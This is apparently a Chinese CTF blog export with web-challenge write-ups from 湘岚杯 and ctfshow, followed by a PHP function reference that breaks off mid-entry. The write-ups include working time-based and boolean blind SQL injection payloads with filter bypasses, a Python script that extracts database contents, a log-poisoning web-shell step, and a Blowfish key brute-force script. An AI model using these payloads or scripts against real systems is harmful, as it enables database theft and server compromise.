ctfer平台(\n\n![image-20250122005404467](../image/achieve/202411/湘岚杯/image-20250122005404467.png)\n\n一个登录系统界面，不过我在登录界面发现如果用户名是admin的话只会提示密码错误，而输入其他的则会提示用户名不存在，应该是需要登录admin账号伪造admin，但是测试了之后发现这里应该没得漏洞可以打，那就只能先注册登进去看看了\n\n进去后在个人资料页面看到有头像上传\n\n![image-20250122005943169](../image/achieve/202411/湘岚杯/image-20250122005943169.png)\n\n想测一下是不是文件上传漏洞，后面发现这个实例是在无痕窗口开的，chrome的插件和代理都不能用，bp用不了那我玩啥，直接看wp学习了\n\n果然，是在主页抓包然后进行admin伪造，拿到一个pingpingping.php的路由\n\n测试一下发现可以打rce，但是过滤的函数有很多，rce成功了也没有输出，那就直接反弹shell\n\n## 冷暴力\n\n![image-20250122203451888](../image/achieve/202411/湘岚杯/image-20250122203451888.png)\n\n题目提示是时间盲注，传入1and sleep(5)语句后也确实有时间延迟，应该是时间盲注，测试一下\n\n```\n1 and if(1,sleep(2),1)#出现延迟\n1 and if(length(1)=1,sleep(2),1)#正常延迟\n1 and if(substr('ctf',1,1)='c',sleep(2),1)#无延迟，用双写绕过substr就有延迟了\n1 and if(ascasciiii(subsubstrstr((select grougroupp_concat(schema_name)from information_schema.schemata),1,1))>'32',sleep(2),1)#一个个测出来是过滤了group和ascii\n1 and if(ascasciiii(subsubstrstr((select grougroupp_concat(table_name)from information_schema.tables where table_schema=dadatabasetabase()),1,1))>'32',sleep(2),1)#过滤了database\n```\n\n然后直接上脚本就行了，后面跑的时候发现flag也被过滤了，绕过flag才能拿到flag\n\n","tags":["湘岚杯"],"categories":["赛题wp"]},{"title":"ctfshowAK赛","url":"/2024/12/21/ctfshowAK赛/","content":"\n# 签到_观己\n\n```php\n<?php\n\nif(isset($_GET['file'])){\n    $file = $_GET['file'];\n    if(preg_match('/php/i', $file)){\n        die('error');\n    }else{\n        include($file);\n    }\n\n}else{\n    highlight_file(__FILE__);\n}\n\n?>\n```\n\ninclude文件包含，allow_url_include没有开启没有办法用伪协议，我们用日志注入，先看一下服务器版本\n\n![image-20241226171032857](./../image/achieve/202411/ctfshow--web专题/image-20241226171032857-1735204238570-1.png)\n\n访问nginx的日志文件后在UA头传入一句话木马，然后用蚁剑连马就可以了\n\n![image-20241226171623918](./../image/achieve/202411/ctfshow--web专题/image-20241226171623918.png)\n\n# web1_观字\n\n![image-20250130133855036](../image/achieve/202411/ctfshow--web专题/image-20250130133855036.png)\n\n两个判断句，第一个是需要我们传入的url的前七位是http协议头，第二个判断句是需要我们绕过正则匹配，但是这里的小数点被过滤了，直接传域名的话肯定不好使\n\n本来想着用进制表示去绕过的，但是0也被绕过了，进制也用不了\n\n![image-20250130135322318](../image/achieve/202411/ctfshow--web专题/image-20250130135322318.png)\n\n后面看了包的wp写的是用。去代替小数点\n\n**在url中 `.`可以用`。`替代**\n\npayload\n\n```\n?url=http://192。168。7。68/flag\n```\n\n# web2_观星\n\n打开题目很像是之前的一道sql注入的题目\n\n![image-20250110185937266-1736506785997-1](../image/achieve/202411/ctfshow--web专题/image-20250110185937266-1736506785997-1.png)\n\n但是这道题过滤了很多东西，fuzz后发现大量函数都被过滤了，可以测出来是布尔盲注的，页面返回成功信息是\"文章列表\"\n\n![image-20250130130148936](../image/achieve/202411/ctfshow--web专题/image-20250130130148936-1738213310966-3.png)\n\n这里ascii函数被过滤了，我用ord去进行绕过，\n\n测试2^1和2^0后可以发现回显不一样\n\n```\nid=2^0\n回显A Child's Dream of a Star\nid=2^1\n回显I asked nothing\n```\n\n意味着注入成功的话会返回I asked nothing的结果，那我们用布尔盲注去做\n\npayload\n\n```\nid=1^case(ord(substr(database()from(1)for(1))))when(102)then(2)else(3)end\n```\n\n借鉴一下师傅的盲注脚本(来自羽师傅)\n\n```python\nimport requests\nurl=\"http://150da11b-ecd3-4dda-9f56-1ebc2ea3cd05.challenge.ctf.show/index.php?id=1^\"\nflag=\"\"\nfor i in range(1,50):\n    print(\"i=\"+str(i))\n    for j in range(38,126):\n        #u=\"case(ord(substr(database()from({0})for(1))))when({1})then(2)else(3)end\".format(i,j)  #库名  web1\n        #u=\"case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)regexp(database()))from({0})for(1))))when({1})then(2)else(3)end\".format(i,j) #表名 flag、page、user\n        #u=\"case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)regexp(0x666c6167))from({0})for(1))))when({1})then(2)else(3)end\".format(i,j) #列名 FLAG_COLUMN、flag\n        u=\"case(ord(substr((select(group_concat(flag))from(flag))from({0})for(1))))when({1})then(2)else(3)end\".format(i,j) #flag字段\n        u=url+u\n        r=requests.get(u)\n        t=r.text\n        if(\"I asked nothing\" in t):\n            flag+=chr(j)\n            print(flag)\n            break\n```\n\n解释一下payload\n\nfrom……for就不说了，就是绕过逗号用的，从第一个字符开始截取一个字符\n\n**`case ... when ... then ... else ... end`**\n\n1. - 这是一个条件表达式。它根据某个条件的值返回不同的结果。\n   - 具体来说，`case ord(substr(database() from 1 for 1))` 这部分将检查数据库名称第一个字符的 ASCII 值。\n   - 如果这个值是 `102`（对应字符 'f'），则返回 `2`；否则返回 `3`。\n\n最后的就是我们的异或运算了\n\n- 如果 `ord` 的结果是 `102`（即返回 `2`），那么计算为 `1 ^ 2`，结果是 `3`。\n- 如果 `ord` 的结果不是 `102`（即返回 `3`），那么计算为 `1 ^ 3`，结果是 `2`。\n\n所以这里的话判断成功就会返回3，那么结合1^2的话就会返回    `I asked nothing`文章，以此可以进行布尔盲注\n\n# web3_观图\n\n![image-20250130135801962](../image/achieve/202411/ctfshow--web专题/image-20250130135801962.png)\n\n抓包看到服务器版本是nginx/1.20.1\n\n![image-20250130140145630](../image/achieve/202411/ctfshow--web专题/image-20250130140145630.png)\n\n以为是cve版本漏洞，后面在源码中发现路由，访问拿到源码\n\n```php\n<?php\n\n//$key = substr(md5('ctfshow'.rand()),3,8);\n//flag in config.php\ninclude('config.php');\nif(isset($_GET['image'])){\n    $image=$_GET['image'];\n    $str = openssl_decrypt($image, 'bf-ecb', $key);\n    if(file_exists($str)){\n        header('content-type:image/gif');\n        echo file_get_contents($str);\n    }\n}else{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n这里的话使用 `openssl_decrypt` 函数对传入的 `$image` 参数进行解密。这里采用的是 `bf-ecb` 加密算法（即 Blowfish 的电子密码本模式），并使用之前生成的 `$key` 作为密钥。\n\n但是这种密钥是可以进行爆破得出来的，刚好前面有个image图片可以作为参考，放个exp\n\n```php\n<?php\n    for($i=0;$i<getrandmax();$i++){\n        $key = substr(md5('ctfshow'.$i),3,8);  //5a78dbb4\n        $image=\"Z6Ilu83MIDw=\";\n        $str = openssl_decrypt($image, 'bf-ecb', $key);\n        if(strpos($str,\"gif\") or strpos($str,\"jpg\") or strpos($str,\"png\")){\n            print($str.\"\\n\");\n            print($i.\"\\n\");\n            print($key.\"\\n\");\n            break;\n        }\n    }\n    $flag = openssl_encrypt('config.php', 'bf-ecb', '5a78dbb4');\n    print($flag);\n```\n\n`getrandmax()`函数返回随机数可能返回的最大值，既然有上限即可进行爆破来得出`key`值\n\n得出来我们的随机数是27347\n\n```php\n<?php\n\n$key = substr(md5('ctfshow'.'27347'),3,8);\n$image=\"config.php\";\n$str = openssl_decrypt($image, 'bf-ecb', $key);\necho $str;\n?>\n```\n\n拿到加密文件N6bf8Bd8jm0SpmTZGl0isw==，但是访问后拿不到文件内容，我后面看了wp才知道可以用wget把图片下载下来\n\n![image-20250130142933015](../image/achieve/202411/ctfshow--web专题/image-20250130142933015.png)\n\n然后cat读取文件就能拿到flag了\n\n# web4_观心\n\n![image-20250320203221967](../image/achieve/202411/ctfshow--web专题/image-20250320203221967.png)\n\n在源码中有提示`<!-- flag in filesystem /flag.txt -->`\n\n抓包后发现了两个参数比那个且提示了一些关于XML的，这里xml还没学，后面学了回来补\n\n","tags":["AK赛"],"categories":["ctfshow"]},{"title":"php函数知识点积累","url":"/2024/12/19/php函数知识点积累/","content":"\n# 0x01前言\n\n做一期函数的知识点积累，方便忘记的时候查阅\n\n# 0x02正文\n\n## mb_strpos()函数\n\n查找字符串在另一个字符串中首次出现的位置\n\n语法\n\n```\nmb_strpos(\n    string $haystack,\n    string $needle,\n    int $offset = 0,\n    ?string $encoding = null\n): int|false\n```\n\n参数\n\n- `haystack`\n\n  要被检查的 [string](https://www.php.net/manual/zh/language.types.string.php)。\n\n- `needle`\n\n  在 `haystack` 中查找这个字符串。 和 [strpos()](https://www.php.net/manual/zh/function.strpos.php) 不同的是，数字的值不会被当做字符的顺序值。\n\n- `offset`\n\n  搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。\n\n- `encoding`\n\n  `encoding` 参数为字符编码。如果省略或是 **`null`**，则使用内部字符编码。\n\n返回值\n\n返回 string 的 `haystack` 中 `needle` 首次出现位置的数值。 如果没有找到 `needle`，它将返回 **`false`**。\n\n## mb_substr()函数\n\n获取部分字符串\n\n```\nmb_substr(\n    string $string,\n    int $start,\n    ?int $length = null,\n    ?string $encoding = null\n): string\n```\n\n参数\n\n- `string`\n\n  从该 [string](https://www.php.net/manual/zh/language.types.string.php) 中提取子字符串。\n\n- `start`\n\n  如果 `start` 不是负数，返回的字符串会从 `string` 第 `start` 的位置开始，从 0 开始计数。举个例子，字符串 '`abcdef`'，位置 `0` 的字符是 '`a`'，位置 `2` 的字符是 '`c`'，以此类推。如果 `start` 是负数，返回的字符串是从 `string` 末尾处第 `start` 个字符开始的。\n\n- `length`\n\n  `string` 中要使用的最大字符数。如果省略了此参数或者传入了 `NULL`，则会提取到字符串的尾部。\n\n- `encoding`\n\n  `encoding` 参数为字符编码。如果省略或是 **`null`**，则使用内部字符编码。\n\n返回值\n\n**mb_substr()** 函数根据 `start` 和 `length` 参数返回 `string` 中指定的部分。\n\n## implode函数\n\nimplode—用于将数组的元素连接成一个字符串\n\n语法\n\n```php\nimplode(string $separator, array $array): string\n```\n\n参数¶\n\n- `separator`\n\n  可选。默认为空字符串。\n\n- `array`\n\n  要分解的字符串数组。\n\n返回值¶\n\n返回一个字符串，其中包含所有数组元素的字符串表示形式，这些元素的顺序相同，并且每个元素之间有分隔符字符串。\n\n## preg_replace()函数\n\n(PHP 4, PHP 5, PHP 7, PHP 8)\n\npreg_replace — 执行一个正则表达式的搜索和替换\n\n基础语法\n\n```php\npreg_replace(\n    string|array $pattern,\n    string|array $replacement,\n    string|array $subject,\n    int $limit = -1,\n    int &$count = null\n): string|array|null\n```\n\n参数说明\n\n| 参数           | 描述                         |\n| -------------- | ---------------------------- |\n| `$pattern`     | 要搜索的正则表达式模式       |\n| `$replacement` | 替换字符串或回调函数         |\n| `$subject`     | 要搜索替换的目标字符串或数组 |\n| `$limit`       | 可选，最大替换次数           |\n| `$count`       | 可选，填充实际替换次数的变量 |\n\n返回值\n\n- 如果 `subject` 是一个数组，**preg_replace()** 返回一个数组，其他情况下返回一个字符串。\n- 发生错误时返回 NULL\n\n## str_split()函数\n\n在 PHP 中，`str_split()` 函数用于 **将字符串分割为字符数组**，通常用于处理字符级操作。\n\n基础语法\n\n```\narray str_split(string $string, int $length = 1)\n```\n\n- 参数\n  - `$string`：要分割的字符串。\n  - `$length`（可选）：每个数组元素的字符长度（默认为 `1`，即逐字符分割）。\n- 返回值\n  - 返回一个数组，包含分割后的字符或子串。\n\n## phpinfo()函数\n\n`phpinfo()` 是一个 PHP 函数，用于输出当前 PHP 环境的详细信息。这包括 PHP 的版本、已加载的扩展、配置信息、服务器信息、环境变量、已定义的常量等。使用 `phpinfo()` 可以帮助开发者和系统管理员快速了解服务器的 PHP 配置。\n\n## addslashes()函数\n\n`addslashes()` 函数是 PHP 中的一个内置函数，用于在字符串中添加反斜杠（`\\`）以转义特定字符，例如以下字符\n\n- 反斜杠 (`\\`)\n- 单引号 (`'`)\n- 双引号 (`\"`)\n- NULL 字符\n\n## getimagesize()函数\n\n`getimagesize()` 是 PHP 的一个内置函数，用于获取图像文件的尺寸和类型信息。这个函数能够识别多种图像格式，包括 JPEG、PNG、GIF 等，并返回一个数组，其中包含有关图像的各种信息。\n\n语法\n\n```php\narray getimagesize ( string $filename [, array $options = [] ] )\n```\n\n参数：\n\n- **$filename**：指定要检查的图像文件的路径。\n- **$options**（可选）：可以传递一个数组来设置特定的选项。\n\n返回值：\n\n如果成功，`getimagesize()` 返回一个包含以下信息的数组：\n\n1. 图像的宽度（以像素为单位）\n2. 图像的高度（以像素为单位）\n3. 图像的类型（常量，如 IMAGETYPE_JPEG、IMAGETYPE_PNG 等）\n4. 一个字符串，包含图像的 MIME 类型\n5. （可选）图像的实际尺寸信息\n\n## eval()函数\n\n在 PHP 中，`eval()` 函数用于将字符串作为 PHP 代码执行。它可以动态地执行代码\n\n基础语法\n\n```php\neval(string $code): mixed\n```\n\n- `$code`：要执行的 PHP 代码字符串。\n- 返回值：如果代码包含返回语句，将返回返回值；如果没有返回值，将返回 `null`。\n\n示例\n\n```php\n<?php\n$expression = '3 + 5';\n$result = eval(\"return $expression;\");\necho $result;  // 输出: 8\n?>\n```\n\n## file_get_contents()函数\n\n`file_get_contents()` 是 PHP 中用于读取文件内容的函数。它可以用于从文件系统、URL、流或数据中读取文件内容，并将其作为字符串返回。\n\n基础语法\n\n```php\nstring file_get_contents ( string $filename [, bool $use_include_path = FALSE [, resource $context [, int $offset = -1 [, int $maxlen ]]]] )\n```\n\n- `$filename`: 必需，要读取的文件名或 URL。\n- `$use_include_path`: 可选，如果设置为 TRUE，则在 include_path 中搜索文件。默认为 FALSE。\n- `$context`: 可选，用于指定上下文的选项和参数。\n- `$offset`: 可选，从文件的哪个位置开始读取。默认为 -1，表示从文件开头开始读取。\n- `$maxlen`: 可选，指定最大读取的字节数。默认为读取整个文件。\n\n返回值\n\n- 如果成功，`file_get_contents()` 函数会返回文件内容的字符串。\n- 如果失败，`file_get_contents()` 函数会返回 FALSE。\n\n示例\n\n```php\n// 读取本地文件内容\n$content = file_get_contents('example.txt');\n\n// 读取远程 URL 的内容\n$content = file_get_contents('http://www.example.com');\n\n// 读取文件的一部分\n$partial_content = file_get_contents('example.txt', NULL, NULL, 10, 20);\n```\n\n### 小tips:\n\n当PHP的 file_get_contents() 函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞\n\n## array_merge()函数\n\n`array_merge()` 是 PHP 中用于合并一个或多个数组的函数。它将多个数组合并为一个数组，如果数组中有相同的字符串键名，后面的数组的值将覆盖前面的数组的值。如果数组中有数字键名，`array_merge()` 将重新排列这些键名，使得结果数组的键名从零开始递增。\n\n基础语法\n\n```php\narray array_merge ( array ...$arrays )\n```\n\n- `$arrays`: 一个或多个要合并的数组。\n\n返回值\n\n- 返回合并后的数组。如果没有提供数组，则返回一个空数组。\n\n示例\n\n```php\n$array1 = array(\"a\" => \"apple\", \"b\" => \"banana\");\n$array2 = array(\"b\" => \"blueberry\", \"c\" => \"cherry\");\n$array3 = array(\"d\" => \"date\");\n\n// 合并数组\n$result = array_merge($array1, $array2, $array3);\n\nprint_r($result);\n//输出结果\nArray\n(\n    [a] => apple\n    [b] => blueberry\n    [c] => cherry\n    [d] => date\n)\n```\n\n## show_source()函数\n\n`show_source()` 是 PHP 中的一个函数，用于输出指定文件的源代码，并在浏览器中高亮显示。\n\n基础语法\n\n```php\nvoid show_source ( string $filename [, int $highlight = 1 ] )\n```\n\n- **$filename**: 必需，指定要显示源代码的文件名（可以是 PHP 文件或其他文本文件）。\n- **$highlight**: 可选，默认值为 1。如果设置为 1，PHP 将高亮显示源代码；如果设置为 0，则不进行高亮显示。\n\n示例\n\n```\n// 显示当前文件的源代码\nshow_source(__FILE__);\n\n// 显示特定文件的源代码\nshow_source('example.php');\n```\n\n返回值\n\n- `show_source()` 函数没有返回值，它直接输出文件的内容。\n\n## strstr()函数\n\n- `strstr` 函数用于查找一个字符串在另一个字符串中的首次出现。如果找到了，它会返回从匹配位置到字符串末尾的部分；如果没有找到，则返回 `false`。`strstr` 是区分大小写的。\n\n函数原型\n\n```\nphp\nstring strstr ( string $haystack , string $needle [, bool $before_needle = false ] )\n```\n\n1. **`$haystack`**：要搜索的字符串，即干草堆。\n2. **`$needle`**：要查找的子字符串，即针。\n3. **`$before_needle`**（可选）：如果设置为 `true`，则返回 `$needle` 出现之前的部分；如果未设置或设置为 `false`，则返回从 `$needle` 出现的位置开始到 `$haystack` 末尾的部分。\n\n## preg_match()函数\n\n![image-20250428092145955](../image/achieve/202411/php特性---ctfshow/image-20250428092145955.png)\n\n![image-20250428092220871](../image/achieve/202411/php特性---ctfshow/image-20250428092220871.png)\n\n### PCRE正则语法\n\n#### 分割符号\n\n![image-20250428092450339](../image/achieve/202411/php特性---ctfshow/image-20250428092450339.png)\n\n如果需要在正则模式内匹配分隔符，必须使用反斜线转义。如果分隔符经常在 正则模式内出现， 最好使用其他分隔符以便提高可读性。\n\n#### 正则表达式元字符\n\n![image-20250428092606408](../image/achieve/202411/php特性---ctfshow/image-20250428092606408.png)\n\n#### 关于断言目标的起止\n\n##### 脱字符(^)\n\n在一个字符类外面，在默认匹配模式下， 脱字符（`^`） 是一个断言当前匹配点位于目标字符串开始处的断言。 在一个字符类内部， 脱字符（`^`） 表明这个字符类中描述的字符取反(这个在上面元字符里也有介绍)。\n\n脱字符（`^`）并不一定要是模式的第一个字符， 但是如果处于某个可选分支时， 它应该是该分支的首字符。如果所有选择分支都以脱字符（`^`）开头，这就是说， 如果模式限制为只匹配目标的开头， 它被称为是一个 ”紧固” 模式。\n\n##### 美元符($)\n\n美元符(`$`)是用于断言当前匹配点位于目标字符串末尾， 或当目标字符串以换行符结尾时当前匹配点位于该换行符位置(默认情况)。 美元符(`$`)不一定要作为模式的最后一个字符，但是如果它在某个可选分支中时， 就应该位于该分支的末尾。美元符在字符类中没有特殊的意义。\n\n#### 字符类\n\n左方括号开始一个字符类的描述，并以右方括号结束，如果一个右方括号需要作为一个字符类中的成员, 那么可以将它写在字符类的首字符处(如果使用了 ^ 取反， 那么是第二个)或者使用转义符。\n\n例如，字符类[aeiou]匹配所有的小写元音字母\n\n在字符类中，一个中划线(减号 -)可以用于指定从一个字符到另一个字符的范围。 比如，[d-m]匹配d到m之间的所有字符\n\n在一个字符范围描述后面不能使用右中括号。 比如一个模式 [W-]46] 被解释为一个包含 W 和 - 的字符类，后面紧跟字符串 ”46]”， 因此它可以匹配 ”W46]” 或 ”-46]”。然而， 如果中括号是经过转义的， 它将会被解释为范围的终点， 因此 [W-\\]46] 就会被解释为一个单独的包含 W 至 ] 范围内所有字符以及 4、6 的字符类。 8 进制或 16 进制描述的中括号同样可以用于作为范围的终点。\n\n#### 可选路径(|)\n\n竖线字符用于分离模式中的可选路径。 比如模式`gilbert|Sullivan`匹配 ”gilbert” 或者 ”sullivan”。 竖线可以在模式中出现任意多个，并且允许有空的可选路径(匹配空字符串)。 匹配的处理从左到右尝试每一个可选路径，并且使用第一个成功匹配的。 如果可选路径在子组(下面定义)中， 则”成功匹配”表示同时匹配了子模式中的分支以及主模式中的其他部分。\n\n#### 模式修饰符\n\n1. **`i` (case-insensitive)**:\n   - 使匹配不区分大小写。例如，`/a/i` 可以匹配 `a` 和 `A`。\n2. **`m` (multi-line mode)**:\n   - 改变 `^` 和 `$` 的行为，使其能够匹配每行的起始和结束，而不仅仅是整个字符串的开头和结尾。\n3. **`s` (single-line mode, also known as dotall)**:\n   - 如果设置了这个修饰符，模式中的点元字符（.）将匹配所有字符，包括换行符。如果没有设置这个修饰符， 换行符会被排除在外。\n4. **`x` (extended mode)**:\n   - 如果设置了这个修饰符，模式中的空白数据字符会被完全忽略，除非被转义或在字符类内部， 并且在一个未转义的 \"#\" 和下一个换行符之间的字符也会被忽略。\n5. **`u` (unicode mode)**:\n   - 使正则表达式以 UTF-8 模式解释模式和目标字符串，从而处理多字节字符。\n6. **`A`**:\n   - 强制 `^` 仅匹配字符串的开头（即使使用了 `m` 修饰符）。\n7. **`D`**:\n   - 强制 `$` 仅匹配字符串的结尾，而不是行结尾。这在多行模式中常常很有用。\n8. **`U` (ungreedy)**:\n   - 改变量词（如 `*` 和 `+`）的默认贪婪行为，使其成为非贪婪（不贪婪），即先匹配尽可能少的字符。但如果后面跟着 `?`，则变为贪婪。 \n\n### 贪婪模式\n\n**默认方式，量词会尽量匹配尽可能多的字符**，直到无法匹配才回溯（后退）以适应剩余的模式。\n\n- `*`（0次或多次）、`+`（1次或多个）、`?`（0或1次）等默认是**贪婪**的\n- 正则引擎会尝试**最大可能的匹配**\n- 可能导致**大量回溯**（如果后面模式不匹配）\n\n例如**正则** `/a.*b/` **匹配字符串 `\"abcb\"`**\n\n匹配过程\n\n1. `a`匹配`a`\n2. `.*`贪婪匹配，先尝试匹配`bcb`\n3. 由于正则表达式中还有个`b`需要匹配，所以开始回溯\n4. 先去掉最后一个字符，`.*`匹配bc，此时末尾的`b`能匹配上表达式中的`b`，至此匹配成功，回溯结束\n\n### 非贪婪模式\n\n**在量词后加 `?`，使其尽量匹配最短可能的字符**（即一旦满足条件就停止，避免回溯）\n\n- `*?`、`+?`、`??`、`{n,m}?` 都是**非贪婪**的\n- 正则引擎**匹配最短符合要求的字符**\n- **减少不必要的回溯，提高效率**\n\n例如**正则** `/a.*?b/` **匹配字符串 `\"abcb\"`**\n\n匹配过程\n\n1. `a`先匹配`a`\n2. `.*?`非贪婪匹配，尽可能少的匹配字符，一开始先匹配0个字符\n3. 然后到正则中的`b`，去匹配`abcb`中第一个`b`，此时匹配成功\n4. 最终返回`ab`\n\n## die()函数\n\n在 PHP 中，`die()` 函数用于输出一条消息，并终止当前脚本的执行。与 `exit()` 函数是等效的，都可以用于终止脚本的执行。\n\n基础语法\n\n```php\nvoid die ( string $message )\n```\n\n- `$message`: 可选，要输出的消息。\n\n## include()函数\n\n在 PHP 中，`include()` 函数用于将指定文件的内容包含到当前脚本中并执行。\n\n基础语法\n\n```php\ninclude(string $filename)\n```\n\n- `$filename`: 必需，指定要包含的文件路径。\n\n## md5()函数\n\n在 PHP 中，`md5()` 函数用于计算一个字符串的 MD5 哈希值。MD5（Message-Digest Algorithm 5）是一种广泛使用的加密哈希函数，可以生成一个128位（16字节）的哈希值，通常用32个十六进制数字表示。\n\n基础语法\n\n```php\nstring md5 ( string $str [, bool $raw_output = false ] )\n```\n\n- `$str`: 要计算其 MD5 哈希值的字符串。\n- `$raw_output`: 可选，若设为 `true`，则返回原始的二进制格式的哈希值；若为 `false`（默认值），则返回小写的十六进制格式的哈希值。\n\n示例\n\n```php\n// 计算字符串的 MD5 哈希值\n$string = \"Hello, World!\";\n$hash = md5($string);\necho \"MD5 Hash: \" . $hash; // 输出: MD5 Hash: 65a8e27d8879283831b664bd8b7f0ad4\n```\n\n## setcookie()函数\n\n`setcookie()` 函数用于在客户端设置一个 Cookie，以便在用户的浏览器上存储信息。Cookie 是一种在客户端存储数据的方式，它们能够在用户访问网站时被发送到服务器，从而实现跟踪用户信息、记住用户偏好设置等功能。\n\n基础语法\n\n```php\nsetcookie(name, value, expire, path, domain, secure, httponly);\n```\n\n- `name`: 必需，Cookie 的名称。\n- `value`: 可选，Cookie 的值。\n- `expire`: 可选，过期时间的 Unix 时间戳（秒），超过该时间 Cookie 将失效。\n- `path`: 可选，指定 Cookie 的路径，可访问该 Cookie 的目录。\n- `domain`: 可选，指定 Cookie 的域名，例如 \".example.com\"。\n- `secure`: 可选，布尔值，指定是否仅通过安全的 HTTPS 连接传输 Cookie。\n- `httponly`: 可选，布尔值，指定是否仅通过 HTTP 协议访问 Cookie，JavaScript 将无法访问该 Cookie。\n\n示例\n\n```php\nsetcookie(\"Hash\",md5($secret.$name),time()+3600000);\n//使用 setcookie() 函数将哈希值作为 Cookie 的值设置为名为 \"Hash\" 的 Cookie，并指定了过期时间为当前时间加上 1000 小时。\n这里的话就是设置了时间戳，time()+3600000中time() 函数返回当前时间的时间戳（单位为秒），加上 3600000 秒后即为 Cookie 的过期时间。\n```\n\n## strtoupper()函数\n\n`strtoupper()` 函数是 PHP 中的一个字符串处理函数，用于将字符串中的小写字母转换为大写字母。\n\n基础语法\n\n```PHP\nstrtoupper(string $string): string\n```\n\n- `$string`: 必需，要转换的字符串。\n\n示例\n\n```php\n$str = \"Hello, World!\";\n$upperStr = strtoupper($str);\necho $upperStr; // 输出: HELLO, WORLD!\n```\n\n## substr()函数\n\n`substr()` 函数是 PHP 中的一个字符串处理函数，用于返回字符串的一部分。\n\n基础语法\n\n```php\nsubstr(string $string, int $start, int|null $length = null): string|false\n```\n\n- **`$string`**: 必需，要提取子串的原始字符串。\n- **`$start`**: 必需，提取子串的起始位置（索引从 0 开始）。如果是负数，则从字符串末尾开始计算。\n- **`$length`**: 可选，要提取的子串的长度。如果没有指定，则从起始位置提取到字符串的末尾。如果是负数，则表示从子串的末尾开始计算长度。\n\n示例\n\n```php\n// 示例 1: 提取子串\n$string = \"Hello, World!\";\n$substring1 = substr($string, 7); // 从索引 7 开始，提取到末尾\necho $substring1; // 输出: World!\n\n// 示例 2: 指定长度\n$substring2 = substr($string, 0, 5); // 从索引 0 开始，提取 5 个字符\necho $substring2; // 输出: Hello\n\n// 示例 3: 使用负数索引\n$substring3 = substr($string, -6); // 从字符串末尾开始提取\necho $substring3; // 输出: World!\n\n// 示例 4: 负数长度\n$substring4 = substr($string, 7, -1); // 从索引 7 开始，提取到倒数第一个字符\necho $substring4; // 输出: World\n```\n\n## ord()函数\n\n`ord()` 函数是 PHP 中的一个字符串处理函数，用于返回字符串中第一个字符的 ASCII 值（对于单字节字符）或 Unicode 值（对于多字节字符）。\n\n基础语法\n\n```php\nord(string $string): int|false\n```\n\n- **`$string`**: 必需，要获取其第一个字符 ASCII 值的字符串。该字符串必须长度为 1，即包含一个字符。\n\n返回值\n\n- 返回字符的 ASCII 值（对于单字节字符）或 Unicode 值（对于多字节字符）。\n- 如果输入字符串为空，返回 `false`。\n\n示例\n\n```php\n// 示例 1: 获取字符的 ASCII 值\n$char = \"A\";\n$asciiValue = ord($char);\necho $asciiValue; // 输出: 65\n\n// 示例 2: 获取字符的 Unicode 值\n$char2 = \"中\"; // 中文字符\n$unicodeValue = ord($char2); \n// ord() 只返回字符串第一个字符的 ASCII 值，但如果是多字节字符，会返回第一个字节的值\necho $unicodeValue; // 输出: 228 (中文字符 \"中\" 的第一个字节的值)\n\n// 示例 3: 对于空字符串\n$emptyString = \"\";\n$result = ord($emptyString);\nvar_dump($result); // 输出: bool(false)\n```\n\n## print_r()函数\n\n`print_r()` 函数是 PHP 中用于打印变量内容的函数，通常用于调试目的。\n\n基础语法\n\n```php\nprint_r(mixed $variable, bool $return = false): void|string\n```\n\n- **`$variable`**: 必需，要打印的变量。\n- **`$return`**: 可选，如果设置为 `true`，`print_r()` 函数将返回打印结果而不直接输出。\n\n示例\n\n```php\n// 示例 1: 打印数组\n$array = array('a', 'b', 'c');\nprint_r($array);\n// 输出:\n// Array\n// (\n//     [0] => a\n//     [1] => b\n//     [2] => c\n// )\n```\n\n## array_pop函数\n\n`array_pop()` 是 PHP 中的一个数组函数，它用于移除数组中的最后一个元素并返回该元素的值。这个函数会修改原始数组，使其少了最后一个元素。\n\n```php\nphp\n$fruits = array(\"apple\", \"banana\", \"orange\");\n$lastFruit = array_pop($fruits);\n\necho \"Last fruit: \" . $lastFruit; // 输出 \"Last fruit: orange\"\nprint_r($fruits); // 输出：Array ( [0] => apple [1] => banana )\n```\n\n## explode()函数\n\n`explode()` 函数是 PHP 中用于将字符串分割成数组的一个内置函数\n\n基础语法\n\n```\narray explode(string $delimiter, string $string[, int $limit = PHP_INT_MAX])\n```\n\n参数说明\n\n1. **$delimiter**:\n   - 字符串类型，指定用于分隔字符串的分隔符。当找到这个分隔符时，`explode()` 会在该位置将字符串切割开。\n2. **$string**:\n   - 字符串类型，要被切割的源字符串。\n3. **$limit** (可选):\n   - 整数类型，限制返回的数组元素的数量。如果设置为正数，返回的数组将包含最多 `$limit` 个元素；如果设置为负数，返回的数组将包含所有元素，但去掉最后 `$limit` 个元素。\n\n## intval()函数\n\n`intval()` 函数是 PHP 中的一个内置函数，用于将变量转换为整型。\n\n基础语法\n\n```\nintval(mixed $value, int $base = 10): int\n```\n\n- **`$value`**: 必需，要转换的变量，可以是任何类型。\n- **`$base`**: 可选，表示数字的基数，默认为 10。可以设置为 2（二进制）、8（八进制）、10（十进制）或 16（十六进制）。\n\n返回值\n\n- 返回转换后的整型值。如果 `$value` 不能转换为整型，返回 `0`。\n\n示例\n\n```php\n// 示例 1: 转换字符串\n$stringValue = \"123\";\n$intValue = intval($stringValue);\necho $intValue; // 输出: 123\n\n// 示例 2: 转换浮点数\n$floatValue = 45.67;\n$intValueFromFloat = intval($floatValue);\necho $intValueFromFloat; // 输出: 45\n\n// 示例 3: 布尔值转换\n$boolTrue = true;\n$boolFalse = false;\necho intval($boolTrue);  // 输出: 1\necho intval($boolFalse); // 输出: 0\n\n// 示例 4: 转换包含数字的字符串\n$numericString = \"100 days\";\n$intValueFromString = intval($numericString);\necho $intValueFromString; // 输出: 100\n\n// 示例 5: 使用基数参数\n$hexValue = \"1A\";\n$intValueFromHex = intval($hexValue, 16);\necho $intValueFromHex; // 输出: 26（十六进制数 1A 转换为十进制的结果）\n```\n\n### intval() 的截断特性\n\n`intval()` 函数会将字符串转换为整数，但会截断非数字部分。，例如我们传入2023e1经过处理后就是2023\n\n## strpos()函数\n\n在 PHP 中，`strpos()` 函数用于查找一个字符串在另一个字符串中首次出现的位置\n\n基本语法：\n\n`strpos(string $haystack, string $needle, int $offset = 0): int|false`\n\n- **$haystack**：要搜索的字符串。\n- 